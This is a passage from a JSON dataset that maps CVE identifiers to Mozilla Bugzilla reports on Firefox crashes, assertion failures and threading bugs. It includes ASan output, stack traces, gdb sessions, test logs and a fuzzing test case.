fd fd fa fa 00 fa fa fa fd fd fa fa fd fd 0x0c047ffff5e0: fa fa fd fa fa fa fd fd fa fa 00 06 fa fa fd fd 0x0c047ffff5f0: fa fa fd fa fa fa 00 07 fa fa 00 00 fa fa fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==43399==ABORTING Marking s-s and sec-critical due to heap-buffer-overflow."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1156861",
        "title": "crash in mozilla::plugins::PluginProcessParent::RunLaunchCompleteTask()",
        "description": "[Tracking Requested - why for this release]: topcrash This bug was filed from the Socorro interface and is report bp-3c210213-ad9d-4412-b227-c98062150412. ============================================================= Looks like a recent regression - first reported crash is in build 2015041100. Currently #40 topcrash in 39.0a2. Most crashes have: EXCEPTION_ACCESS_VIOLATION_READ 0x5a5a5a5a so filing it security-sensitive just in case."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1056410",
        "title": "More missing callgraph edges involving destructors",
        "description": "Bug 1047696 looks to have revealed *another* gap in the rooting hazard analysis. Before MOZ_FINAL, PrepareForWrapping called '_ZN14XPCCallContextD1Ev' aka |void XPCCallContext::~XPCCallContext()|, and the analysis didn't think that called anything. The analysis is aware of 4 different destructors: (#1) _ZN14XPCCallContextD1Ev|void XPCCallContext::~XPCCallContext() (#2) _ZN14XPCCallContextD1Ev *INTERNAL* |void XPCCallContext::~XPCCallContext(int32) (#3) _ZN14XPCCallContextD1Ev|void XPCCallContext::~XPCCallContext(int32) (#4) _ZN14XPCCallContextD0Ev|void XPCCallContext::~XPCCallContext() which blows my mind -- notice how the mangled name _ZN14XPCCallContextD1Ev resolves to two different unmangled names, and the unmangled name 'void XPCCallContext::~XPCCallContext()' is associated with two different mangled names. *groan* Anyway, #3 above calls all kinds of stuff, including ~nsRefPtr which is what happens with MOZ_FINAL added as seen in the hazard output at https://ftp-ssl.mozilla.org/pub/mozilla.org/firefox/try-builds/trev.saunders@gmail.com-f9d622c91bed/try-linux64-br-haz/hazards.txt.gz To continue, the *INTERNAL* destructors I already knew about -- they are \"not-in-charge\" destructors for use with virtual inheritance. When they are identical to the \"in-charge\" destructors, gcc aliases them to the same thing in some weird way that is not visible in the output provided to the analysis plugin. I previously fixed that problem by pretending that one of them calls the other, since the analysis plugin would not otherwise see a body for one of them at all. (To be honest, I forget which is which.) But now we seem to have progressed to an even higher degree of insanity. The plugin sees bodies generated for #2 and #4 above, but not for #1 and #3. Without MOZ_FINAL, it sees an edge from PrepareForWrapping to #1. The existing aliasing workaround adds an artificial edge from #3 to #2. There is a natural edge from #4 to #1: the D0 in the mangled name means \"deleting destructor\", which is a destructor that finalizes and additional frees the actual memory. So gcc generates a body that basically calls #1 and then invokes operator delete. So without MOZ_FINAL, we have: PrepareForWrapping -> #1 #4 -> #1 #3 -> #2 #2 -> (important stuff) It looks like we're missing an edge from #1 -> #3. Which are the two suspicious ones -- they have the same mangled name, but differ by an int32 parameter."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1159973",
        "title": "crash in js::frontend::Parser<js::frontend::SyntaxParseHandler>::unaryExpr(js::frontend::Parser<js::frontend::SyntaxParseHandler>::InvokedPrediction)",
        "description": "This bug was filed from the Socorro interface and is report bp-228e68c8-0202-48c2-b763-7ddd72150423. ============================================================= New signature in 38/39/40, first report in build 2015022400. Reported crashes over the past 28 days: Product Version Percentage Number Of Crashes Firefox 38.0b6 26.81 % 740 Firefox 38.0b1 16.30 % 450 Firefox 38.0b5 15.62 % 431 Firefox 38.0b4 14.64 % 404 Firefox 38.0b3 13.55 % 374 Firefox 38.0b2 7.14 % 197 Firefox 39.0a2 4.24 % 117 Firefox 40.0a1 1.16 % 32 Firefox 38.0a2 0.43 % 12 Firefox 38.0b8 0.04 % 1 Firefox 39.0a1 0.04 % 1 FennecAndroid 38.0b4 0.04 % 1"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1163359",
        "title": "Crash [@ moz_speex_inner_product_single ] | Assertion failure: aIndex < Length() (invalid array index)",
        "description": "1. http://buu.yle.fi/jul14/14/ 2. Crash [@ moz_speex_inner_product_single ] bp-5832804a-18c1-454e-ada3-6951e2150510 rated as low exploitability -> s-s or in debug Assertion failure: aIndex < Length() (invalid array index), at ../../../dist/include/nsTArray.h:970 Lots of intermittent unittests with this assertion. Appears to be all branches/OS."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1172397",
        "title": "Replaying a HTMLMediaElement streamed over a PeerConnection can crash WebRTC",
        "description": "From bug 1171907: When I try to play() a captured media element streaming over a PeerConnection that has ended (stream has not ended), we crash here: > * frame #0: 0x0000000101f58a1d XUL`mozilla::WebrtcAudioConduit::ValidateCodecConfig(mozilla::AudioCodecConfig const*, bool) const [inlined] std::string::size() const + 4 at basic_string.h:606 > frame #1: 0x0000000101f58a19 XUL`mozilla::WebrtcAudioConduit::ValidateCodecConfig(mozilla::AudioCodecConfig const*, bool) const [inlined] std::string::empty() const at basic_string.h:686 > frame #2: 0x0000000101f58a19 XUL`mozilla::WebrtcAudioConduit::ValidateCodecConfig(this=0x000000012b9fa330, codecInfo=0x000000012c684000, send=true) const + 25 at AudioConduit.cpp:1031 > frame #3: 0x0000000101f58595 XUL`mozilla::WebrtcAudioConduit::ConfigureSendMediaCodec(this=0x000000012b9fa330, codecConfig=0x000000012c684000) + 101 at AudioConduit.cpp:364 > frame #4: 0x0000000101f6d6f3 XUL`mozilla::MediaPipelineTransmit::PipelineListener::ProcessVideoChunk(this=<unavailable>, conduit=<unavailable>, chunk=<unavailable>) + 3107 at MediaPipeline.cpp:1229 > frame #5: 0x0000000101f6bc4d XUL`mozilla::MediaPipelineTransmit::PipelineListener::NewData(this=0x0000000126733f20, graph=<unavailable>, tid=<unavailable>, offset=<unavailable>, events=<unavailable>, media=0x000000011eecb460) + 989 at MediaPipeline.cpp:958 > frame #6: 0x0000000101f6c028 XUL`mozilla::MediaPipelineTransmit::PipelineListener::NotifyQueuedTrackChanges(this=<unavailable>, graph=<unavailable>, tid=<unavailable>, offset=<unavailable>, events=<unavailable>, queued_media=<unavailable>) + 808 at MediaPipeline.cpp:894 > frame #7: 0x000000010353004a XUL`mozilla::TrackUnionStream::CopyTrackData(this=0x000000011f6f6300, aInputTrack=0x00000001152f3ec0, aMapIndex=<unavailable>, aFrom=<unavailable>, aTo=649728, aOutputTrackFinished=0x0000000137b6e87f) + 714 at TrackUnionStream.cpp:286"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1151650",
        "title": "GfxInfoBase::GetFeatureStatus() sends an IPDL message off the main thread",
        "description": "This is similar to bug 1146416. It looks like GfxInfoBase::GetFeatureStatus(int, int*) is being called off the main thread, which makes us send an IPDL message to the parent. While this is happening, we have a script blocker which ends up capturing some main thread stuff, and running it off the main thread. https://crash-stats.mozilla.com/report/index/3c3806c2-9cca-4914-9eac-ec8a82150402#allthreads"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1159321",
        "title": "Well-known symbols in jsid's should not fire pre-barriers",
        "description": "Like permanent atoms, I think we need to exclude these from barriers as they may be used from different runtimes."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1163852",
        "title": "Intermittent test_peerConnection_addSecondVideoStream.html | application terminated with exit code -5",
        "description": "14:20:55 INFO - ++DOCSHELL 0x96f15800 == 8 [pid = 3573] [id = 49] 14:20:55 INFO - ++DOMWINDOW == 23 (0x971f2c00) [pid = 3573] [serial = 102] [outer = (nil)] 14:20:55 INFO - ++DOMWINDOW == 24 (0x9a0eb400) [pid = 3573] [serial = 103] [outer = 0x971f2c00] 14:20:55 INFO - [Child 3624] WARNING: ENSURE_MAIN_PROCESS failed. Cannot SetCString from content process: media.webrtc.debug.log_file: file /builds/slave/m-in-lx-d-00000000000000000000/build/src/modules/libpref/Preferences.cpp, line 1516 14:20:55 INFO - [Child 3624] WARNING: ENSURE_MAIN_PROCESS failed. Cannot SetCString from content process: media.webrtc.debug.aec_log_dir: file /builds/slave/m-in-lx-d-00000000000000000000/build/src/modules/libpref/Preferences.cpp, line 1516 14:20:56 INFO - [Parent 3573] WARNING: No docshells for remote frames!: file /builds/slave/m-in-lx-d-00000000000000000000/build/src/dom/base/nsFrameLoader.cpp, line 492 14:20:56 INFO - [Parent 3573] WARNING: No docshells for remote frames!: file /builds/slave/m-in-lx-d-00000000000000000000/build/src/dom/base/nsFrameLoader.cpp, line 492 14:20:56 INFO - JavaScript error: chrome://browser/content/webrtcIndicator.js, line 51: TypeError: gStringBundle is undefined 14:20:56 INFO - [Parent 3573] WARNING: Enabling vsync compositor: file /builds/slave/m-in-lx-d-00000000000000000000/build/src/gfx/layers/ipc/CompositorParent.cpp, line 677 14:20:56 INFO - [Parent 3573] ###!!! ASSERTION: /build/buildd/glib2.0-2.32.1/./glib/gmem.c:358: overflow allocating 1515870810*16 bytes: 'glib assertion', file /builds/slave/m-in-lx-d-00000000000000000000/build/src/toolkit/xre/nsSigHandlers.cpp, line 138 14:21:19 INFO - #01: my_glib_log_func [toolkit/xre/nsSigHandlers.cpp:140] 14:21:19 INFO - (firefox:3573): GLib-ERROR **: /build/buildd/glib2.0-2.32.1/./glib/gmem.c:358: overflow allocating 1515870810*16 bytes 14:21:19 INFO - -1323444032[b0f310c0]: [main|sdp_config] sdp_config.c:86: SDP: Initialized config pointer: 0x9e8a4d60 14:21:19 INFO - -1323444032[b0f310c0]: [1431379255029545 (id=2147483742 url=http://mochi.test:8888/tests/dom/media/tests/mochitest/test_peerConnection_addSecondVideoSt]: stable -> have-local-offer 14:21:19 INFO - [Child 3624] WARNING: pipe error (3): Connection reset by peer: file /builds/slave/m-in-lx-d-00000000000000000000/build/src/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 459 14:21:19 INFO - [Child 3624] ###!!! ABORT: Aborting on channel error.: file /builds/slave/m-in-lx-d-00000000000000000000/build/src/ipc/glue/MessageChannel.cpp, line 1662 14:21:19 INFO - #01: mozilla::ipc::MessageChannel::OnChannelErrorFromLink() [ipc/glue/MessageChannel.cpp:1662] 14:21:19 INFO - #02: mozilla::ipc::ProcessLink::OnChannelError() [ipc/glue/MessageLink.cpp:405] 14:21:19 INFO - #03: IPC::Channel::ChannelImpl::OnFileCanReadWithoutBlocking(int) [ipc/chromium/src/chrome/common/ipc_channel_posix.cc:879] 14:21:19 INFO - #04: base::MessagePumpLibevent::OnLibeventNotification(int, short, void*) [ipc/chromium/src/base/message_pump_libevent.cc:231] 14:21:19 INFO - #05: event_base_loop [ipc/chromium/src/third_party/libevent/event.c:1350] 14:21:19 INFO - #06: base::MessagePumpLibevent::Run(base::MessagePump::Delegate*) [ipc/chromium/src/base/message_pump_libevent.cc:357] 14:21:19 INFO - #07: MessageLoop::RunInternal() [ipc/chromium/src/base/message_loop.cc:233] 14:21:19 INFO - #08: MessageLoop::Run() [ipc/chromium/src/base/message_loop.cc:517] 14:21:19 INFO - #09: base::Thread::ThreadMain() [ipc/chromium/src/base/thread.cc:173] 14:21:19 INFO - #10: ThreadFunc [ipc/chromium/src/base/platform_thread_posix.cc:41] 14:21:19 INFO - #11: libpthread.so.0 + 0x6d4c 14:21:19 INFO - [Child 3624] ###!!! ABORT: Aborting on channel error.: file /builds/slave/m-in-lx-d-00000000000000000000/build/src/ipc/glue/MessageChannel.cpp, line 1662 14:21:19 INFO - Hit MOZ_CRASH() at /builds/slave/m-in-lx-d-00000000000000000000/build/src/memory/mozalloc/mozalloc_abort.cpp:33 14:21:20 INFO - TEST-INFO | Main app process: killed by out-of-range signal, number 123 14:21:20 INFO - 82 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | A valid string reason is expected 14:21:20 INFO - 83 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | Reason cannot be empty 14:21:20 INFO - 84 INFO Network setup is not required 14:21:20 INFO - 85 INFO Creating PeerConnectionWrapper (pcLocal) 14:21:20 INFO - 86 INFO Creating PeerConnectionWrapper (pcRemote) 14:21:20 INFO - 87 INFO Run step 1: PC_SETUP_SIGNALING_CLIENT 14:21:20 INFO - 88 INFO Run step 2: PC_LOCAL_SETUP_ICE_LOGGER 14:21:20 INFO - 89 INFO Run step 3: PC_REMOTE_SETUP_ICE_LOGGER 14:21:20 INFO - 90 INFO Run step 4: PC_LOCAL_SETUP_SIGNALING_LOGGER 14:21:20 INFO - 91 INFO Run step 5: PC_REMOTE_SETUP_SIGNALING_LOGGER 14:21:20 INFO - 92 INFO Run step 6: PC_LOCAL_SETUP_ADDSTREAM_HANDLER 14:21:20 INFO - 93 INFO Run step 7: PC_REMOTE_SETUP_ADDSTREAM_HANDLER 14:21:20 INFO - 94 INFO Run step 8: PC_LOCAL_CHECK_INITIAL_SIGNALINGSTATE 14:21:20 INFO - 95 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | Initial local signalingState is 'stable' 14:21:20 INFO - 96 INFO Run step 9: PC_REMOTE_CHECK_INITIAL_SIGNALINGSTATE 14:21:20 INFO - 97 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | Initial remote signalingState is 'stable' 14:21:20 INFO - 98 INFO Run step 10: PC_LOCAL_CHECK_INITIAL_ICE_STATE 14:21:20 INFO - 99 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | Initial local ICE connection state is 'new' 14:21:20 INFO - 100 INFO Run step 11: PC_REMOTE_CHECK_INITIAL_ICE_STATE 14:21:20 INFO - 101 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | Initial remote ICE connection state is 'new' 14:21:20 INFO - 102 INFO Run step 12: PC_LOCAL_GUM 14:21:20 INFO - 103 INFO Get 1 local streams 14:21:20 INFO - 104 INFO Call getUserMedia for {\"video\":true} 14:21:20 INFO - 105 INFO PeerConnectionWrapper (pcLocal) gUM local stream {478b1c81-5d72-41df-96c0-5e9f92b141e7} with video track {46d110b5-d173-48da-a968-af8bdad25f3a} 14:21:20 INFO - 106 INFO Got media stream: video (local) 14:21:20 INFO - 107 INFO PeerConnectionWrapper (pcLocal): \"onnegotiationneeded\" event fired 14:21:20 INFO - 108 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | addStream adds sender 14:21:20 INFO - 109 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | track has id 14:21:20 INFO - 110 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | track has kind 14:21:20 INFO - 111 INFO Run step 13: PC_REMOTE_GUM 14:21:20 INFO - 112 INFO Get 1 local streams 14:21:20 INFO - 113 INFO Call getUserMedia for {\"video\":true} 14:21:20 INFO - 114 INFO canplaythrough fired for media element pcLocal_local1_video 14:21:20 INFO - 115 INFO PeerConnectionWrapper (pcRemote) gUM local stream {b8722e28-22b1-4e76-a597-f173e582cffb} with video track {4a224b3d-43b4-4f0b-be1c-2d390b13e39e} 14:21:20 INFO - 116 INFO Got media stream: video (local) 14:21:20 INFO - 117 INFO PeerConnectionWrapper (pcRemote): \"onnegotiationneeded\" event fired 14:21:20 INFO - 118 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | addStream adds sender 14:21:20 INFO - 119 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | track has id 14:21:20 INFO - 120 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | track has kind 14:21:20 INFO - 121 INFO Run step 14: PC_LOCAL_SETUP_ICE_HANDLER 14:21:20 INFO - 122 INFO Run step 15: PC_REMOTE_SETUP_ICE_HANDLER 14:21:20 INFO - 123 INFO Run step 16: PC_LOCAL_STEEPLECHASE_SIGNAL_EXPECTED_LOCAL_TRACKS 14:21:20 INFO - 124 INFO Run step 17: PC_REMOTE_STEEPLECHASE_SIGNAL_EXPECTED_LOCAL_TRACKS 14:21:20 INFO - 125 INFO Run step 18: PC_LOCAL_GET_EXPECTED_REMOTE_TRACKS 14:21:20 INFO - 126 INFO Run step 19: PC_REMOTE_GET_EXPECTED_REMOTE_TRACKS 14:21:20 INFO - 127 INFO Run step 20: PC_LOCAL_CREATE_OFFER 14:21:20 INFO - 128 INFO Got offer: {\"type\":\"offer\",\"sdp\":\"v=0\\r\\no=mozilla...THIS_IS_SDPARTA-40.0a1 5543845458266036880 0 IN IP4 0.0.0.0\\r\\ns=-\\r\\nt=0 0\\r\\na=fingerprint:sha-256 BA:F1:AD:7C:5C:8B:0C:D8:5E:C9:B4:CF:1F:6A:DA:6A:8B:F4:31:91:D3:58:EB:7C:C1:B3:FE:84:E4:D4:EB:75\\r\\na=group:BUNDLE sdparta_0\\r\\na=ice-options:trickle\\r\\na=msid-semantic:WMS *\\r\\nm=video 9 RTP/SAVPF 120 126 97\\r\\nc=IN IP4 0.0.0.0\\r\\na=sendrecv\\r\\na=fmtp:120 max-fs=12288;max-fr=60\\r\\na=fmtp:126 profile-level-id=42e01f;level-asymmetry-allowed=1;packetization-mode=1\\r\\na=fmtp:97 profile-level-id=42e01f;level-asymmetry-allowed=1\\r\\na=ice-pwd:d7d27fcd8d71d483c2b5d8946083e374\\r\\na=ice-ufrag:dbca644f\\r\\na=mid:sdparta_0\\r\\na=msid:{478b1c81-5d72-41df-96c0-5e9f92b141e7} {46d110b5-d173-48da-a968-af8bdad25f3a}\\r\\na=rtcp-fb:120 nack\\r\\na=rtcp-fb:120 nack pli\\r\\na=rtcp-fb:120 ccm fir\\r\\na=rtcp-fb:120 ccm tmmbr\\r\\na=rtcp-fb:126 nack\\r\\na=rtcp-fb:126 nack pli\\r\\na=rtcp-fb:126 ccm fir\\r\\na=rtcp-fb:126 ccm tmmbr\\r\\na=rtcp-fb:97 nack\\r\\na=rtcp-fb:97 nack pli\\r\\na=rtcp-fb:97 ccm fir\\r\\na=rtcp-fb:97 ccm tmmbr\\r\\na=rtcp-mux\\r\\na=rtpmap:120 VP8/90000\\r\\na=rtpmap:126 H264/90000\\r\\na=rtpmap:97 H264/90000\\r\\na=setup:actpass\\r\\na=ssrc:3358678933 cname:{36afb69d-826e-4856-a59e-3a7fd6158083}\\r\\n\"} 14:21:20 INFO - 129 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | Local create offer does not change signaling state 14:21:20 INFO - 130 INFO Run step 21: PC_LOCAL_STEEPLECHASE_SIGNAL_OFFER 14:21:20 INFO - 131 INFO Run step 22: PC_LOCAL_SET_LOCAL_DESCRIPTION 14:21:20 INFO - 132 INFO PeerConnectionWrapper (pcLocal): \"onsignalingstatechange\" event fired 14:21:20 INFO - 133 INFO PeerConnectionWrapper (pcLocal): 'signalingstatechange' event received 14:21:20 INFO - 134 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | PeerConnectionWrapper (pcLocal): legal signaling state transition from stable to have-local-offer 14:21:20 INFO - 135 INFO PeerConnectionWrapper (pcLocal): Successfully set the local description 14:21:20 INFO - 136 INFO TEST-PASS | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | signalingState after local setLocalDescription is 'have-local-offer' 14:21:20 INFO - 137 INFO Run step 23: PC_REMOTE_GET_OFFER 14:21:20 INFO - 138 INFO Run step 24: PC_REMOTE_SET_REMOTE_DESCRIPTION 14:21:20 WARNING - TEST-UNEXPECTED-FAIL | dom/media/tests/mochitest/test_peerConnection_addSecondVideoStream.html | application terminated with exit code -5 14:21:20 INFO - runtests.py | Application ran for: 0:04:26.759346 14:21:20 INFO - zombiecheck | Reading PID log: /tmp/tmpsHEvnLpidlog 14:21:20 INFO - ==> process 3573 launched child process 3624 14:21:20 INFO - zombiecheck | Checking for orphan process with PID: 3624 14:21:20 INFO - Stopping web server 14:21:20 INFO - Stopping web socket server 14:21:20 INFO - Stopping ssltunnel 14:21:20 INFO - TEST-INFO | leakcheck | default process: leak threshold set at 0 bytes 14:21:20 INFO - TEST-INFO | leakcheck | plugin process: leak threshold set at 0 bytes 14:21:20 INFO - TEST-INFO | leakcheck | tab process: leak threshold set at 25000 bytes 14:21:20 INFO - TEST-INFO | leakcheck | geckomediaplugin process: leak threshold set at 20000 bytes 14:21:20 WARNING - TEST-UNEXPECTED-FAIL | leakcheck | tab process: missing output line for total leaks! 14:21:20 INFO - TEST-INFO | leakcheck | missing output line from log file /tmp/tmpM6NVJK.mozrunner/runtests_leaks_tab_pid3624.log 14:21:20 WARNING - TEST-UNEXPECTED-FAIL | leakcheck | default process: missing output line for total leaks! 14:21:20 INFO - TEST-INFO | leakcheck | missing output line from log file /tmp/tmpM6NVJK.mozrunner/runtests_leaks.log 14:21:20 INFO - runtests.py | Running tests: end. 14:21:20 INFO - SUITE-END | took 280s 14:21:20 ERROR - Return code: 251 14:21:20 ERROR - No tests run or test summary not found 14:21:20 INFO - TinderboxPrint: mochitest-plain-chunked<br/><em class=\"testfail\">T-FAIL</em> 14:21:20 WARNING - # TBPL FAILURE # 14:21:20 WARNING - The mochitest suite: plain-chunked ran with return status: FAILURE 14:21:20 INFO - Running post-action listener: _package_coverage_data 14:21:20 INFO - Running post-action listener: _resource_record_post_action 14:21:20 INFO - Running post-run listener: _resource_record_post_run 14:21:21 INFO - Total resource usage - Wall time: 305s; CPU: 100.0%; Read bytes: 2818048; Write bytes: 168591360; Read time: 100; Write time: 253432 14:21:21 INFO - install - Wall time: 24s; CPU: 100.0%; Read bytes: 0; Write bytes: 98234368; Read time: 0; Write time: 205244 14:21:21 INFO - run-tests - Wall time: 282s; CPU: 100.0%; Read bytes: 2785280; Write bytes: 62238720; Read time: 100; Write time: 24496 14:21:21 INFO - Running post-run listener: _upload_blobber_files 14:21:21 INFO - Blob upload gear active."
      }
    ],
    "CVE-2015-2726": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1146416",
        "title": "NS_OpenAnonymousTemporaryFile() runs main thread code when run off the main thread",
        "description": "lmandel found this crash report on crash stats: https://crash-stats.mozilla.com/report/index/c3fccd5e-042e-4939-8751-b91dd2150323 MessageChannel::Send() is being called off the main thread, but somehow triggers a DelayedFireDOMPaintEvent::Run() that gets caught and then run by the script blocker. Jed, is it expected that we can call NS_OpenAnonymousTemporaryFile() from off the main thread? I can't tell which layer involved is not handling the off main thread case."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1059081",
        "title": "TCPSocket crash in nsMultiplexInputStream::ReadSegments on \"Socket Thread\" due to apparent racey use of nsMultiplexInputStream",
        "description": "The Gaia email app uses TCPSocket in our back-end tests using b2g-desktop in a non-OOP mode. I have observed intermittent crashes in nsMultiplexInputStream::ReadSegments. I'm not exactly clear what's going on, but the fact that TCPSocket.js calls removeStream(0) and appendStream(...) on the main thread while nsMultiplexInputStream::ReadSegments is doing something on the \"Socket Thread\" without any apparent synchronization constructs seems like it could explain things. The call stack on an -O1 self-built trunk build from earlier today looks like this: #0 nsMultiplexInputStream::ReadSegments (this=0x2aaaca7bb740, aWriter=<optimized out>, aClosure=<optimized out>, aCount=65536, aResult=0x2aaabeaffbcc) 318 rv = mStreams[mCurrentStream]->ReadSegments(ReadSegCb, &state, aCount, &read); #1 0x00002aaaac9dae65 in nsStreamCopierIB::DoCopy (this=<optimized out>, aSourceCondition=0x2aaabeaffc08, aSinkCondition=0x2aaabeaffc0c) at xpcom/io/nsMultiplexInputStream.cpp:318 #2 0x00002aaaac9db093 in Process (this=0x2aaad01f0500) at xpcom/io/nsStreamUtils.cpp:291 #3 nsAStreamCopier::Run (this=0x2aaad01f0500) at xpcom/io/nsStreamUtils.cpp:414 #4 0x00002aaaac9e7588 in nsThread::ProcessNextEvent (this=0x2aaabe8263c0, aMayWait=<optimized out>, aResult=0x2aaabeaffcef) #5 0x00002aaaaca053ee in NS_ProcessNextEvent (aThread=<optimized out>, aMayWait=<optimized out>) #6 0x00002aaaaca37c3e in nsSocketTransportService::Run (this=0x2aaaabd8f600) at netwerk/base/src/nsSocketTransportService2.cpp:744 #7 0x00002aaaac9e7588 in nsThread::ProcessNextEvent (this=0x2aaabe8263c0, aMayWait=<optimized out>, aResult=0x2aaabeaffdcf) #8 0x00002aaaaca053ee in NS_ProcessNextEvent (aThread=<optimized out>, aMayWait=<optimized out>) #9 0x00002aaaacc56927 in mozilla::ipc::MessagePumpForNonMainThreads::Run (this=0x2aaabe82d040, aDelegate=0x2aaaabd67060) #10 0x00002aaaacc3532a in MessageLoop::RunInternal (this=this@entry=0x2aaaabd67060) #11 0x00002aaaacc35598 in RunHandler (this=0x2aaaabd67060) #12 MessageLoop::Run (this=this@entry=0x2aaaabd67060) #13 0x00002aaaac9ebee3 in nsThread::ThreadFunc (aArg=0x2aaabe8263c0) #14 0x00002aaaabfd2fb8 in _pt_root (arg=0x2aaaabd37920) #15 0x00002aaaaacd8182 in start_thread (arg=0x2aaabeb00700) #16 0x00002aaaab7f738d in clone () (gdb) p *mStreams.mHdr $20 = { static sEmptyHdr = { static sEmptyHdr = <same as static member of an already seen type>, mLength = 0, mCapacity = 0, mIsAutoArray = 0 }, mLength = 2, mCapacity = 3, mIsAutoArray = 0 } (gdb) x/4g mStreams.mHdr 0x2aaad0f0ee20: 0x0000000300000002 0x00002aaac153a400 0x2aaad0f0ee30: 0x00002aaac153a4c0 0x5a5a5a5a5a5a5a5a (gdb) p mCurrentStream $21 = 1 Unfortunately, Elements() seems to have been optimized out The disassembly around the crash point start from the while loop comparator is: 0x00002aaaac9ccc58 <+102>: cmp %r12d,%edx 0x00002aaaac9ccc5b <+105>: jae 0x2aaaac9ccce6 <nsMultiplexInputStream::ReadSegments(tag_nsresult (*)(nsIInputStream*, void*, char const*, unsigned int, unsigned int, unsigned int*), void*, unsigned int, unsigned int*)+244> 0x00002aaaac9ccc61 <+111>: jmp 0x2aaaac9cccd5 <nsMultiplexInputStream::ReadSegments(tag_nsresult (*)(nsIInputStream*, void*, char const*, unsigned int, unsigned int, unsigned int*), void*, unsigned int, unsigned int*)+227> 0x00002aaaac9ccc63 <+113>: lea 0x1c(%rsp),%r15 0x00002aaaac9ccc68 <+118>: lea 0x20(%rsp),%r14 0x00002aaaac9ccc6d <+123>: lea -0x3e4(%rip),%r13 # 0x2aaaac9cc890 <nsMultiplexInputStream::ReadSegCb(nsIInputStream*, void*, char const*, unsigned int, unsigned int, unsigned int*)> 0x00002aaaac9ccc74 <+130>: mov %edx,%edx // get mStreams 0x00002aaaac9ccc76 <+132>: mov 0x28(%rbx),%rax // get mStreams.mHdr.element[1] (not literally, but) 0x00002aaaac9ccc7a <+136>: mov 0x8(%rax,%rdx,8),%rdi => 0x00002aaaac9ccc7f <+141>: mov (%rdi),%rax 0x00002aaaac9ccc82 <+144>: mov %r15,%r8 0x00002aaaac9ccc85 <+147>: mov %ebp,%ecx 0x00002aaaac9ccc87 <+149>: mov %r14,%rdx 0x00002aaaac9ccc8a <+152>: mov %r13,%rsi 0x00002aaaac9ccc8d <+155>: callq *0x30(%rax) (gdb) info registers rax rbx rdx rdi rax 0x2aaaca642500 46913028367616 rbx 0x2aaaca7bb740 46913029912384 rdx 0x1 1 rdi 0x100000001 4294967297 // just confirming offsets here (gdb) p this $27 = (nsMultiplexInputStream * const) 0x2aaaca7bb740 (gdb) p &mStreams $26 = (nsTArray<nsCOMPtr<nsIInputStream> > *) 0x2aaaca7bb768 (gdb) x 0x100000001 0x100000001: Cannot access memory at address 0x100000001 I'm guessing that subscripting the nsTArray raced a main-thread call to appendStream and this resulted in a corrupt/crazy value. Although 0x100000001 is a pretty bad-ass pointer. I think this is probably concerning for B2G in both non-OOP and OOP since based on the remoting currently in use, all the same risky business would happen in the parent process. I'm not marking this a security bug, though, since TCPSocket is a privileged-only API within the circle of trust, if you will. cc'ing other affected email people, leaving this up to Core::Network people for assessment/etc."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1132265",
        "title": "Assertion failure: entry.isIon() || entry.isBaseline() || entry.isIonCache(), at jit/JitFrames.cpp",
        "description": "// Randomly chosen test: js/src/jit-test/tests/basic/bug908915.js (function() { function callFromJIT(f) { f(); } const fs = [ function() { /* warm up the caller */ }, function() { enableSPSProfiling(); enableSingleStepProfiling(); }, ]; for each (let f in fs) { callFromJIT(f); } })(); asserts js debug shell on m-c changeset ee093ca70666 with --fuzzing-safe --no-threads --ion-eager at Assertion failure: entry.isIon() || entry.isBaseline() || entry.isIonCache(), at jit/JitFrames.cpp. Debug configure options: LD=ld CROSS_COMPILE=1 CC=\"clang -Qunused-arguments -msse2 -mfpmath=sse -arch i386\" RANLIB=ranlib CXX=\"clang++ -Qunused-arguments -msse2 -mfpmath=sse -arch i386\" AS=$CC AR=ar STRIP=\"strip -x -S\" HOST_CC=\"clang -Qunused-arguments -msse2 -mfpmath=sse\" AUTOCONF=/usr/local/Cellar/autoconf213/2.13/bin/autoconf213 HOST_CXX=\"clang++ -Qunused-arguments -msse2 -mfpmath=sse\" sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=i386-apple-darwin9.2.0 --enable-macos-target=10.5 --enable-arm-simulator --enable-debug --enable-profiling --enable-nspr-build --enable-more-deterministic --with-ccache --enable-gczeal --enable-debug-symbols --disable-tests python -u 